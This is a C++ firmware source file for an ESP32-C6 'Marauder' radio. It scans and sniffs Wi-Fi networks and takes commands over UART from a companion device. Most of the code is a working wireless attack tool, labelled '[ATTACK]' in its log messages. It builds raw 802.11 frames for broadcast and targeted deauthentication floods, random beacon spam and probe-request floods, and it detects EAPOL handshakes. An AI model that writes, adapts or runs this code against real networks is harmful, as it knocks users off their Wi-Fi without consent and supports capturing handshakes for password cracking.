// =====================================================
// NanoC6 (ESP32-C6) - MARAUDER RADIO COMPLET CORRIGÉ
// - Protocole AA .. 55 compatible avec Tab5_MarauderUI
// =====================================================

#include <Arduino.h>

extern "C" {
    #include "freertos/FreeRTOS.h"
    #include "freertos/task.h"
    #include "freertos/queue.h"
    #include "esp_wifi.h"
    #include "esp_wifi_types.h"
    #include "esp_system.h"
    #include "esp_event.h"
    #include "nvs_flash.h"
    #include "esp_netif.h"
}

// =====================================================
//  UART VERS P4
// =====================================================

HardwareSerial RadioSerial(1);
static const int C6_UART_TX = 2;  // C6 TX -> P4 RX (GPIO1)
static const int C6_UART_RX = 1;  // C6 RX <- P4 TX (GPIO0)
static const uint32_t RADIO_BAUD = 115200;

// =====================================================
//  PROTOCOLE
// =====================================================

#define PROTO_START     0xAA
#define PROTO_END       0x55

// Messages C6 -> P4
#define MSG_READY       0x01
#define MSG_AP_FOUND    0x10
#define MSG_STA_FOUND   0x11
#define MSG_PROBE_REQ   0x12
#define MSG_DEAUTH_DET  0x13
#define MSG_BEACON      0x14
#define MSG_EAPOL       0x15
#define MSG_PACKET      0x16
#define MSG_SCAN_DONE   0x17
#define MSG_ACK         0x18
#define MSG_ERROR       0x19
#define MSG_STATUS      0x1A

// Commandes P4 -> C6
#define CMD_SCAN_AP      0x20
#define CMD_SCAN_STA     0x21
#define CMD_SNIFF_PROBE  0x22
#define CMD_SNIFF_DEAUTH 0x23
#define CMD_SNIFF_BEACON 0x24
#define CMD_SNIFF_EAPOL  0x25
#define CMD_PACKET_MON   0x26
#define CMD_DEAUTH       0x30
#define CMD_DEAUTH_TARG  0x31
#define CMD_BEACON_SPAM  0x32
#define CMD_BEACON_RAND  0x33
#define CMD_BEACON_CLONE 0x34
#define CMD_PROBE_FLOOD  0x35
#define CMD_STOP         0x40
#define CMD_SET_CHANNEL  0x41
#define CMD_GET_STATUS   0x42
#define CMD_CHANNEL_HOP  0x43

// =====================================================
//  CONSTANTES
// =====================================================

#define N_AP_MAX             64
#define N_STA_MAX            128
#define CHANNEL_HOP_DELAY_MS 200
#define SCAN_TIMEOUT_MS      10000
#define DEAUTH_BURST_COUNT   20
#define DEAUTH_DELAY_MS      5

// =====================================================
//  STRUCTURES
// =====================================================

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    int8_t rssi;
    uint8_t channel;
    uint8_t encryption;
    bool sent_to_p4;
} AccessPoint;

typedef struct {
    uint8_t mac[6];
    uint8_t bssid[6];
    int8_t rssi;
    bool sent_to_p4;
} Station;

typedef struct {
    uint8_t type;
    uint16_t len;
    uint8_t data[256];
} Command;

// =====================================================
//  ÉTAT GLOBAL
// =====================================================

static QueueHandle_t cmdQueue = nullptr;
static TaskHandle_t radioTaskHandle = nullptr;
static TaskHandle_t channelHopTaskHandle = nullptr;

static AccessPoint ap_list[N_AP_MAX];
static int ap_count = 0;

static Station sta_list[N_STA_MAX];
static int sta_count = 0;

static volatile uint8_t current_mode = 0;
static volatile uint8_t current_channel = 1;
static volatile bool is_running = false;
static volatile bool channel_hopping = false;

static uint8_t target_bssid[6] = {0};
static uint8_t target_sta[6]   = {0};

static uint32_t packet_count = 0;
static uint32_t deauth_count = 0;
static uint32_t beacon_count = 0;
static uint32_t probe_count  = 0;
static uint32_t eapol_count  = 0;

static uint32_t scan_start_time = 0;

// =====================================================
//  PROTOCOLE UART
// =====================================================

static void send_message(uint8_t type, const uint8_t* data, uint16_t len) {
    uint8_t header[4];
    header[0] = PROTO_START;
    header[1] = type;
    header[2] = (len >> 8) & 0xFF;
    header[3] = len & 0xFF;

    RadioSerial.write(header, 4);
    if (len > 0 && data != nullptr) {
        RadioSerial.write(data, len);
    }

    uint8_t checksum = type ^ header[2] ^ header[3];
    for (uint16_t i = 0; i < len; i++) {
        checksum ^= data[i];
    }
    RadioSerial.write(checksum);
    RadioSerial.write(PROTO_END);
    RadioSerial.flush();

    Serial.printf("[TX] type=0x%02X len=%u\n", type, len);
}

static void send_ready() {
    send_message(MSG_READY, nullptr, 0);
}

static void send_ack(uint8_t cmd) {
    send_message(MSG_ACK, &cmd, 1);
}

static void send_error(uint8_t code) {
    send_message(MSG_ERROR, &code, 1);
}

static void send_scan_done() {
    send_message(MSG_SCAN_DONE, nullptr, 0);
}

static void send_ap_found(AccessPoint* ap) {
    uint8_t buf[50];
    memcpy(buf, ap->bssid, 6);
    buf[6] = (uint8_t)ap->rssi;
    buf[7] = ap->channel;
    buf[8] = ap->encryption;

    uint8_t ssid_len = strlen(ap->ssid);
    if (ssid_len > 32) ssid_len = 32;
    buf[9] = ssid_len;
    memcpy(buf + 10, ap->ssid, ssid_len);

    send_message(MSG_AP_FOUND, buf, 10 + ssid_len);
}

static void send_sta_found(Station* sta) {
    uint8_t buf[13];
    memcpy(buf, sta->mac, 6);
    memcpy(buf + 6, sta->bssid, 6);
    buf[12] = (uint8_t)sta->rssi;

    send_message(MSG_STA_FOUND, buf, 13);
}

static void send_probe_request(const uint8_t* mac, int8_t rssi, const char* ssid) {
    uint8_t buf[50];
    memcpy(buf, mac, 6);
    buf[6] = (uint8_t)rssi;

    uint8_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    buf[7] = ssid_len;
    memcpy(buf + 8, ssid, ssid_len);

    send_message(MSG_PROBE_REQ, buf, 8 + ssid_len);
    probe_count++;
}

static void send_deauth_detected(const uint8_t* src, const uint8_t* dst,
                                 const uint8_t* bssid, uint16_t reason, uint8_t ch) {
    uint8_t buf[21];
    memcpy(buf, src, 6);
    memcpy(buf + 6, dst, 6);
    memcpy(buf + 12, bssid, 6);
    memcpy(buf + 18, &reason, 2);
    buf[20] = ch;

    send_message(MSG_DEAUTH_DET, buf, 21);
    deauth_count++;
}

static void send_status() {
    uint8_t buf[28];

    buf[0] = current_mode;
    buf[1] = current_channel;
    buf[2] = is_running ? 1 : 0;
    buf[3] = channel_hopping ? 1 : 0;

    memcpy(buf + 4,  &packet_count, 4);
    memcpy(buf + 8,  &deauth_count, 4);
    memcpy(buf + 12, &beacon_count, 4);
    memcpy(buf + 16, &probe_count,  4);
    memcpy(buf + 20, &eapol_count,  4);

    uint16_t ap_c  = (uint16_t)ap_count;
    uint16_t sta_c = (uint16_t)sta_count;
    memcpy(buf + 24, &ap_c,  2);
    memcpy(buf + 26, &sta_c, 2);

    send_message(MSG_STATUS, buf, 28);
}

// =====================================================
//  CHANNEL HOP TASK
// =====================================================

void channelHopTask(void* param) {
    while (true) {
        if (channel_hopping && is_running) {
            uint8_t ch = current_channel + 1;
            if (ch > 13) ch = 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            current_channel = ch;
        }
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_HOP_DELAY_MS));
    }
}

// =====================================================
//  FRAME HELPERS
// =====================================================

#define FRAME_TYPE_MGMT 0x00
#define FRAME_TYPE_DATA 0x02

#define FRAME_SUBTYPE_PROBE_REQ   0x04
#define FRAME_SUBTYPE_BEACON      0x08
#define FRAME_SUBTYPE_DISASSOC    0x0A
#define FRAME_SUBTYPE_DEAUTH      0x0C

static bool is_broadcast(const uint8_t* mac) {
    for (int i = 0; i < 6; ++i) {
        if (mac[i] != 0xFF) return false;
    }
    return true;
}
static bool is_multicast(const uint8_t* mac) {
    return (mac[0] & 0x01) != 0;
}

static bool extract_ssid(const uint8_t* frame, int len, char* ssid_out, int offset) {
    ssid_out[0] = '\0';

    int pos = offset;
    while (pos < len - 2) {
        uint8_t tag     = frame[pos];
        uint8_t tag_len = frame[pos + 1];

        if (pos + 2 + tag_len > len) break;

        if (tag == 0) {
            if (tag_len > 32) tag_len = 32;
            memcpy(ssid_out, &frame[pos + 2], tag_len);
            ssid_out[tag_len] = '\0';
            return true;
        }
        pos += 2 + tag_len;
    }
    return false;
}

// =====================================================
//  PROMISCUOUS CALLBACK
// =====================================================

static void wifi_promiscuous_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!is_running) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    packet_count++;

    uint16_t frame_ctrl   = frame[0] | (frame[1] << 8);
    uint8_t  frame_type   = (frame_ctrl >> 2) & 0x03;
    uint8_t  frame_sub    = (frame_ctrl >> 4) & 0x0F;

    const uint8_t* addr1 = &frame[4];
    const uint8_t* addr2 = &frame[10];
    const uint8_t* addr3 = &frame[16];

    int8_t  rssi    = pkt->rx_ctrl.rssi;
    uint8_t channel = pkt->rx_ctrl.channel;

    // ---- SCAN AP (Beacons) ----
    if (current_mode == CMD_SCAN_AP &&
        frame_type == FRAME_TYPE_MGMT &&
        frame_sub  == FRAME_SUBTYPE_BEACON) {

        bool exists = false;
        for (int i = 0; i < ap_count; i++) {
            if (memcmp(ap_list[i].bssid, addr3, 6) == 0) {
                ap_list[i].rssi = rssi;
                exists = true;
                break;
            }
        }

        if (!exists && ap_count < N_AP_MAX) {
            AccessPoint* ap = &ap_list[ap_count];
            memcpy(ap->bssid, addr3, 6);
            ap->rssi       = rssi;
            ap->channel    = channel;
            ap->encryption = 0;
            extract_ssid(frame, len, ap->ssid, 36);
            ap->sent_to_p4 = false;
            ap_count++;

            send_ap_found(ap);
            ap->sent_to_p4 = true;
        }
        beacon_count++;
    }

    // ---- SCAN STA (Data) ----
    if (current_mode == CMD_SCAN_STA &&
        frame_type == FRAME_TYPE_DATA) {

        if (!is_broadcast(addr2) && !is_multicast(addr2)) {
            bool exists = false;
            for (int i = 0; i < sta_count; i++) {
                if (memcmp(sta_list[i].mac, addr2, 6) == 0) {
                    sta_list[i].rssi = rssi;
                    exists = true;
                    break;
                }
            }

            if (!exists && sta_count < N_STA_MAX) {
                Station* sta = &sta_list[sta_count];
                memcpy(sta->mac,   addr2, 6);
                memcpy(sta->bssid, addr3, 6);
                sta->rssi = rssi;
                sta->sent_to_p4 = false;
                sta_count++;

                send_sta_found(sta);
                sta->sent_to_p4 = true;
            }
        }
    }

    // ---- PROBE REQUESTS ----
    if (current_mode == CMD_SNIFF_PROBE &&
        frame_type == FRAME_TYPE_MGMT &&
        frame_sub  == FRAME_SUBTYPE_PROBE_REQ) {

        char ssid[33] = {0};
        extract_ssid(frame, len, ssid, 24);
        send_probe_request(addr2, rssi, ssid);
    }

    // ---- DEAUTH/DISASSOC ----
    if (current_mode == CMD_SNIFF_DEAUTH &&
        frame_type == FRAME_TYPE_MGMT &&
        (frame_sub == FRAME_SUBTYPE_DEAUTH || frame_sub == FRAME_SUBTYPE_DISASSOC)) {

        uint16_t reason = 0;
        if (len >= 26) {
            reason = frame[24] | (frame[25] << 8);
        }
        send_deauth_detected(addr2, addr1, addr3, reason, channel);
    }

    // ---- SNIFF BEACON ----
    if (current_mode == CMD_SNIFF_BEACON &&
        frame_type == FRAME_TYPE_MGMT &&
        frame_sub  == FRAME_SUBTYPE_BEACON) {
        beacon_count++;
    }

    // ---- SNIFF EAPOL ----
    if (current_mode == CMD_SNIFF_EAPOL &&
        frame_type == FRAME_TYPE_DATA &&
        len > 34) {
        uint16_t ethertype = (frame[30] << 8) | frame[31];
        if (ethertype == 0x888E) {
            send_message(MSG_EAPOL, nullptr, 0);
            eapol_count++;
        }
    }

    // PACKET_MON : juste le compteur
}

// =====================================================
//  TX HELPERS
// =====================================================

static void send_deauth_frame(const uint8_t* bssid, const uint8_t* target, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    current_channel = channel;
    vTaskDelay(pdMS_TO_TICKS(10));

    uint8_t deauth[26];
    deauth[0] = 0xC0;
    deauth[1] = 0x00;
    deauth[2] = 0x00;
    deauth[3] = 0x00;

    if (target != nullptr && !is_broadcast(target)) {
        memcpy(deauth + 4, target, 6);
    } else {
        memset(deauth + 4, 0xFF, 6);
    }

    memcpy(deauth + 10, bssid, 6);
    memcpy(deauth + 16, bssid, 6);

    deauth[22] = 0x00;
    deauth[23] = 0x00;

    deauth[24] = 0x07;
    deauth[25] = 0x00;

    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth, sizeof(deauth), false);
        deauth_count++;

        if (target != nullptr && !is_broadcast(target)) {
            memcpy(deauth + 4, bssid, 6);
            memcpy(deauth + 10, target, 6);
            esp_wifi_80211_tx(WIFI_IF_AP, deauth, sizeof(deauth), false);
            deauth_count++;
        }
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
    }
}

static void send_beacon_frame(const char* ssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    current_channel = channel;

    uint8_t beacon[128];
    int pos = 0;

    beacon[pos++] = 0x80;
    beacon[pos++] = 0x00;
    beacon[pos++] = 0x00;
    beacon[pos++] = 0x00;

    memset(beacon + pos, 0xFF, 6); pos += 6;

    for (int i = 0; i < 6; i++) {
        beacon[pos++] = random(256);
    }
    beacon[10] &= 0xFE;
    beacon[10] |= 0x02;

    memcpy(beacon + pos, beacon + 10, 6);
    pos += 6;

    beacon[pos++] = 0x00;
    beacon[pos++] = 0x00;

    memset(beacon + pos, 0, 8); pos += 8;

    beacon[pos++] = 0x64;
    beacon[pos++] = 0x00;

    beacon[pos++] = 0x01;
    beacon[pos++] = 0x04;

    beacon[pos++] = 0x00;
    int ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    beacon[pos++] = ssid_len;
    memcpy(beacon + pos, ssid, ssid_len);
    pos += ssid_len;

    beacon[pos++] = 0x01;
    beacon[pos++] = 0x08;
    beacon[pos++] = 0x82;
    beacon[pos++] = 0x84;
    beacon[pos++] = 0x8B;
    beacon[pos++] = 0x96;
    beacon[pos++] = 0x0C;
    beacon[pos++] = 0x12;
    beacon[pos++] = 0x18;
    beacon[pos++] = 0x24;

    beacon[pos++] = 0x03;
    beacon[pos++] = 0x01;
    beacon[pos++] = channel;

    esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
    beacon_count++;
}

static void send_probe_flood(uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    current_channel = channel;

    uint8_t probe[32];
    memset(probe, 0, sizeof(probe));

    probe[0] = 0x40;
    probe[1] = 0x00;

    memset(probe + 4, 0xFF, 6);

    for (int i = 0; i < 6; i++) {
        probe[10 + i] = random(256);
    }
    probe[10] &= 0xFE;
    probe[10] |= 0x02;

    memset(probe + 16, 0xFF, 6);

    probe[24] = 0x00;
    probe[25] = 0x00;

    probe[26] = 0x01;
    probe[27] = 0x04;
    probe[28] = 0x02;
    probe[29] = 0x04;
    probe[30] = 0x0B;
    probe[31] = 0x16;

    esp_wifi_80211_tx(WIFI_IF_AP, probe, 32, false);
    probe_count++;
}

// =====================================================
//  PROCESS COMMAND
// =====================================================

static void process_command(Command* cmd) {
    Serial.printf("[CMD] type=0x%02X len=%u\n", cmd->type, cmd->len);

    switch (cmd->type) {
        case CMD_SCAN_AP:
            Serial.println("[MODE] Scan APs");
            ap_count = 0;
            current_mode = CMD_SCAN_AP;
            is_running = true;
            channel_hopping = true;
            scan_start_time = millis();
            send_ack(CMD_SCAN_AP);
            break;

        case CMD_SCAN_STA:
            Serial.println("[MODE] Scan STAs");
            sta_count = 0;
            current_mode = CMD_SCAN_STA;
            is_running = true;
            channel_hopping = true;
            scan_start_time = millis();
            send_ack(CMD_SCAN_STA);
            break;

        case CMD_SNIFF_PROBE:
            Serial.println("[MODE] Sniff Probes");
            current_mode = CMD_SNIFF_PROBE;
            is_running = true;
            channel_hopping = true;
            send_ack(CMD_SNIFF_PROBE);
            break;

        case CMD_SNIFF_DEAUTH:
            Serial.println("[MODE] Sniff Deauth");
            current_mode = CMD_SNIFF_DEAUTH;
            is_running = true;
            channel_hopping = true;
            send_ack(CMD_SNIFF_DEAUTH);
            break;

        case CMD_SNIFF_BEACON:
            Serial.println("[MODE] Sniff Beacons");
            current_mode = CMD_SNIFF_BEACON;
            is_running = true;
            channel_hopping = true;
            send_ack(CMD_SNIFF_BEACON);
            break;

        case CMD_SNIFF_EAPOL:
            Serial.println("[MODE] Sniff EAPOL");
            current_mode = CMD_SNIFF_EAPOL;
            is_running = true;
            channel_hopping = true;
            send_ack(CMD_SNIFF_EAPOL);
            break;

        case CMD_PACKET_MON:
            Serial.println("[MODE] Packet Monitor");
            current_mode = CMD_PACKET_MON;
            is_running = true;
            channel_hopping = true;
            send_ack(CMD_PACKET_MON);
            break;

        case CMD_DEAUTH:
            if (cmd->len >= 7) {
                memcpy(target_bssid, cmd->data, 6);
                current_channel = cmd->data[6];
                Serial.println("[ATTACK] Deauth flood");
                current_mode = CMD_DEAUTH;
                is_running = true;
                channel_hopping = false;
                send_ack(CMD_DEAUTH);
            } else {
                send_error(1);
            }
            break;

        case CMD_DEAUTH_TARG:
            if (cmd->len >= 13) {
                memcpy(target_bssid, cmd->data, 6);
                memcpy(target_sta,   cmd->data + 6, 6);
                current_channel = cmd->data[12];
                Serial.println("[ATTACK] Targeted Deauth");
                current_mode = CMD_DEAUTH_TARG;
                is_running = true;
                channel_hopping = false;
                send_ack(CMD_DEAUTH_TARG);
            } else {
                send_error(1);
            }
            break;

        case CMD_BEACON_SPAM:
            if (cmd->len > 0) {
                Serial.println("[ATTACK] Beacon Spam (list)");
                current_mode = CMD_BEACON_SPAM;
                is_running = true;
                channel_hopping = false;
                send_ack(CMD_BEACON_SPAM);

                // On stocke le buffer dans une static pour usage dans la boucle principale
                // (Simplifié: on utilisera cmd->data tel quel dans la boucle radioMain)
            }
            break;

        case CMD_BEACON_RAND:
            Serial.println("[ATTACK] Beacon Random");
            current_mode = CMD_BEACON_RAND;
            is_running = true;
            channel_hopping = false;
            send_ack(CMD_BEACON_RAND);
            break;

        case CMD_PROBE_FLOOD:
            Serial.println("[ATTACK] Probe Flood");
            current_mode = CMD_PROBE_FLOOD;
            is_running = true;
            channel_hopping = true;
            send_ack(CMD_PROBE_FLOOD);
            break;

        case CMD_STOP:
            Serial.println("[STOP]");
            is_running = false;
            channel_hopping = false;
            current_mode = 0;
            if (scan_start_time > 0) {
                send_scan_done();
                scan_start_time = 0;
            }
            send_ack(CMD_STOP);
            break;

        case CMD_SET_CHANNEL:
            if (cmd->len >= 1) {
                current_channel = cmd->data[0];
                if (current_channel < 1) current_channel = 1;
                if (current_channel > 13) current_channel = 13;
                esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
                Serial.printf("[CHANNEL] Set to %d\n", current_channel);
                send_ack(CMD_SET_CHANNEL);
            }
            break;

        case CMD_GET_STATUS:
            send_status();
            break;

        case CMD_CHANNEL_HOP:
            channel_hopping = !channel_hopping;
            Serial.printf("[HOP] %s\n", channel_hopping ? "ON" : "OFF");
            send_ack(CMD_CHANNEL_HOP);
            break;

        default:
            Serial.printf("[?] Unknown cmd 0x%02X\n", cmd->type);
            send_error(0xFF);
            break;
    }
}

// =====================================================
//  UART RX TASK
// =====================================================

void uartRxTask(void* param) {
    enum { WAIT_START, WAIT_TYPE, WAIT_LEN_H, WAIT_LEN_L, WAIT_DATA, WAIT_CS, WAIT_END } state = WAIT_START;
    Command cmd;
    uint16_t data_idx = 0;

    while (true) {
        if (RadioSerial.available()) {
            uint8_t b = RadioSerial.read();

            switch (state) {
                case WAIT_START:
                    if (b == PROTO_START) state = WAIT_TYPE;
                    break;

                case WAIT_TYPE:
                    cmd.type = b;
                    state = WAIT_LEN_H;
                    break;

                case WAIT_LEN_H:
                    cmd.len = ((uint16_t)b) << 8;
                    state = WAIT_LEN_L;
                    break;

                case WAIT_LEN_L:
                    cmd.len |= b;
                    data_idx = 0;
                    if (cmd.len == 0) {
                        state = WAIT_CS;
                    } else if (cmd.len < sizeof(cmd.data)) {
                        state = WAIT_DATA;
                    } else {
                        state = WAIT_START;
                    }
                    break;

                case WAIT_DATA:
                    cmd.data[data_idx++] = b;
                    if (data_idx >= cmd.len) state = WAIT_CS;
                    break;

                case WAIT_CS: {
                    uint8_t calc = cmd.type ^ ((cmd.len >> 8) & 0xFF) ^ (cmd.len & 0xFF);
                    for (uint16_t i = 0; i < cmd.len; i++) {
                        calc ^= cmd.data[i];
                    }
                    if (b == calc) {
                        state = WAIT_END;
                    } else {
                        Serial.println("[RX] Checksum error");
                        state = WAIT_START;
                    }
                    break;
                }

                case WAIT_END:
                    if (b == PROTO_END) {
                        xQueueSend(cmdQueue, &cmd, 0);
                    }
                    state = WAIT_START;
                    break;
            }
        } else {
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }
}

// =====================================================
//  RADIO MAIN TASK
// =====================================================

void radioMainTask(void* param) {
    Serial.println("[RADIO] Initializing WiFi...");

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }

    esp_netif_init();
    esp_event_loop_create_default();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    esp_wifi_set_mode(WIFI_MODE_AP);
    wifi_config_t ap_config = {};
    strcpy((char*)ap_config.ap.ssid, "ESP32_RADIO");
    ap_config.ap.ssid_len       = strlen("ESP32_RADIO");
    ap_config.ap.channel        = 1;
    ap_config.ap.authmode       = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 1;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    esp_wifi_start();

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(wifi_promiscuous_cb);

    esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);

    current_channel = 1;
    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);

    Serial.println("[RADIO] WiFi Ready, Promiscuous ON (2.4 GHz)");
    vTaskDelay(pdMS_TO_TICKS(500));
    send_ready();
    Serial.println("[RADIO] READY sent to P4");

    Command cmd;
    uint32_t last_status_ms = 0;

    while (true) {
        if (xQueueReceive(cmdQueue, &cmd, pdMS_TO_TICKS(100)) == pdTRUE) {
            process_command(&cmd);
        }

        if (is_running && scan_start_time > 0 &&
            (current_mode == CMD_SCAN_AP || current_mode == CMD_SCAN_STA)) {
            if (millis() - scan_start_time > SCAN_TIMEOUT_MS) {
                Serial.println("[SCAN] Timeout");
                is_running = false;
                channel_hopping = false;
                send_scan_done();
                scan_start_time = 0;
            }
        }

        // Attaques continues non bloquantes
        if (is_running) {
            switch (current_mode) {
                case CMD_DEAUTH:
                    send_deauth_frame(target_bssid, nullptr, current_channel);
                    vTaskDelay(pdMS_TO_TICKS(100));
                    break;

                case CMD_DEAUTH_TARG:
                    send_deauth_frame(target_bssid, target_sta, current_channel);
                    vTaskDelay(pdMS_TO_TICKS(100));
                    break;

                case CMD_BEACON_SPAM: {
                    // On suppose que P4 renvoie périodiquement la liste, sinon simplifié
                    vTaskDelay(pdMS_TO_TICKS(100));
                    break;
                }

                case CMD_BEACON_RAND: {
                    char ssid[16];
                    for (int i = 0; i < 8; i++) ssid[i] = 'A' + random(26);
                    ssid[8] = '\0';
                    uint8_t ch = 1 + (random(11));
                    send_beacon_frame(ssid, ch);
                    vTaskDelay(pdMS_TO_TICKS(50));
                    break;
                }

                case CMD_PROBE_FLOOD:
                    send_probe_flood(current_channel);
                    vTaskDelay(pdMS_TO_TICKS(10));
                    break;

                default:
                    // modes purement sniff/scan: rien à faire ici
                    break;
            }
        }

        uint32_t now = millis();
        if (now - last_status_ms > 2000) {
            last_status_ms = now;
            Serial.printf("[STATUS] CH=%d PKT=%lu AP=%d STA=%d MODE=0x%02X RUN=%d HOP=%d\n",
                          (int)current_channel,
                          (unsigned long)packet_count,
                          ap_count, sta_count,
                          (unsigned)current_mode,
                          is_running ? 1 : 0,
                          channel_hopping ? 1 : 0);
        }
    }
}

// =====================================================
//  SETUP / LOOP
// =====================================================

void setup() {
    Serial.begin(115200);
    delay(500);

    Serial.println();
    Serial.println("╔════════════════════════════════════════════════════════════════╗");
    Serial.println("║     NanoC6 MARAUDER RADIO - Protocol v2.0 (Tab5 Compatible)   ║");
    Serial.println("╚════════════════════════════════════════════════════════════════╝");

    RadioSerial.begin(RADIO_BAUD, SERIAL_8N1, C6_UART_RX, C6_UART_TX);
    Serial.printf("[UART] TX=%d RX=%d BAUD=%d\n", C6_UART_TX, C6_UART_RX, RADIO_BAUD);

    cmdQueue = xQueueCreate(16, sizeof(Command));
    if (!cmdQueue) {
        Serial.println("[FATAL] Queue creation failed!");
        while (1) delay(1000);
    }

    xTaskCreatePinnedToCore(radioMainTask, "radioMain",   8192, nullptr, 5, &radioTaskHandle,      0);
    xTaskCreatePinnedToCore(uartRxTask,    "uartRx",      4096, nullptr, 4, nullptr,              0);
    xTaskCreatePinnedToCore(channelHopTask,"channelHop",  2048, nullptr, 3, &channelHopTaskHandle,0);

    Serial.println("[SETUP] Tasks created");
}

void loop() {
    vTaskDelay(pdMS_TO_TICKS(1000));
}
